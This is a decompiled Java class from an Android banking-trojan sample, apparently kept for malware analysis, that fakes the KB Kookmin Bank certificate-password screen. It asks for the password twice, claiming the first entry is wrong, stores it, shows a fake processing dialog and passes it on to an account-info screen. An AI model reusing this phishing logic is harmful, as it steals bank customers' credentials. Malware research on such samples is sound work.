package com.kbstar.kb.android.star;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.res.Resources;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.Editable;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Toast;
import com.kbstar.kb.android.star.model.Bank;
import com.kbstar.kb.android.star.util.GeneralUtil;
import java.util.List;

public class KB_Cert_Psw
  extends Activity
  implements View.OnClickListener
{
  private final int Next_Page = 201;
  private AppContext appContext;
  private Bank bank;
  private ImageView btn_cert_cancel;
  private ImageView btn_cert_confirm;
  private EditText et_cert_psw;
  @SuppressLint({"HandlerLeak"})
  private Handler handler = new Handler()
  {
    public void handleMessage(Message paramAnonymousMessage)
    {
      super.handleMessage(paramAnonymousMessage);
      switch (paramAnonymousMessage.what)
      {
      default: 
        return;
      }
      KB_Cert_Psw.this.pd.dismiss();
      KB_Cert_Psw.this.et_cert_psw.setText("");
      paramAnonymousMessage = new Intent(KB_Cert_Psw.this, KB_Account_info.class);
      paramAnonymousMessage.putExtra("Bank", KB_Cert_Psw.this.bank);
      KB_Cert_Psw.this.startActivity(paramAnonymousMessage);
    }
  };
  private ProgressDialog pd;
  private Toast toast;
  
  private void initView()
  {
    this.et_cert_psw = ((EditText)findViewById(2131296305));
    this.btn_cert_cancel = ((ImageView)findViewById(2131296307));
    this.btn_cert_confirm = ((ImageView)findViewById(2131296306));
    this.btn_cert_cancel.setOnClickListener(this);
    this.btn_cert_confirm.setOnClickListener(this);
  }
  
  private void validation()
  {
    String str1 = this.appContext.preferences.getString("certpass", "");
    String str2 = this.et_cert_psw.getText().toString().trim();
    if (str2.equalsIgnoreCase(""))
    {
      this.toast = Toast.makeText(getApplicationContext(), getResources().getString(2131361800), 0);
      this.toast.setGravity(17, 0, 0);
      this.toast.show();
      return;
    }
    if (str2.length() < 6)
    {
      this.toast = Toast.makeText(getApplicationContext(), getResources().getString(2131361802), 0);
      this.toast.setGravity(17, 0, 0);
      this.toast.show();
      return;
    }
    if (!str2.equals(str1))
    {
      this.toast = Toast.makeText(getApplicationContext(), getResources().getString(2131361802), 0);
      this.toast.setGravity(17, 0, 0);
      this.toast.show();
      this.appContext.preferences.edit().putString("certpass", str2).commit();
      this.et_cert_psw.setText("");
      return;
    }
    GeneralUtil.dismissKeyBoard(this);
    this.bank.setCertPsw(str2);
    this.pd = new ProgressDialog(this);
    this.pd.setMessage(getResources().getString(2131361815));
    this.pd.show();
    new Thread()
    {
      public void run()
      {
        try
        {
          Thread.sleep(3000L);
          Message localMessage = new Message();
          localMessage.what = 201;
          KB_Cert_Psw.this.handler.sendMessage(localMessage);
          return;
        }
        catch (InterruptedException localInterruptedException)
        {
          localInterruptedException.printStackTrace();
        }
      }
    }.start();
  }
  
  public void onClick(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131296307: 
      finish();
      return;
    }
    validation();
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    GeneralUtil.activityList.add(this);
    this.appContext = ((AppContext)getApplicationContext());
    getWindow().requestFeature(1);
    setContentView(2130903049);
    this.bank = ((Bank)getIntent().getSerializableExtra("Bank"));
    if (this.bank == null)
    {
      finish();
      return;
    }
    initView();
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/KB_Cert_Psw.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */